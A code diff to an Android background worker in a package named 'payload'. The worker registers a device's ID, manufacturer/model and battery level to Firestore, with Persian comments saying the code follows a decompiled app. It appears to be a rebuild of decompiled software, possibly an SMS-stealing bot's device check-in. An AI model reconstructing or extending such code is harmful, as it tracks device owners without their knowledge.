@@ -1,6 +1,8 @@
 package com.payload.jansiix0ne.worker
 
 import android.content.Context
+import android.os.BatteryManager
+import android.os.Build
 import android.util.Log
 import androidx.work.CoroutineWorker
 import androidx.work.WorkerParameters
@@ -12,6 +14,7 @@ import kotlinx.coroutines.withContext
 
 /**
  * Worker that registers device information to Firestore
+ * مطابق کد decompiled: C3020G.java
  */
 class RegisterUserWorker(
     context: Context,
@@ -24,11 +27,17 @@ class RegisterUserWorker(
         try {
             val deviceId = SmsHelper.getDeviceId(applicationContext)
             
-            // Get device information
+            // Get device information - مطابق کد decompiled
+            val mobileName = "${Build.MANUFACTURER} ${Build.MODEL}"
+            
+            // Get battery level - مطابق کد decompiled: BatteryManager.getIntProperty(4)
+            val batteryManager = applicationContext.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
+            val batteryLevel = batteryManager?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: 0
+            
             val deviceModel = DeviceModel(
                 deviceId = deviceId,
-                mobileName = android.os.Build.MODEL,
-                charge = "0" // TODO: Get actual battery level
+                mobileName = mobileName,
+                charge = "$batteryLevel%"
             )
             
             val result = firestoreRepository.saveDeviceInfo(deviceId, deviceModel)
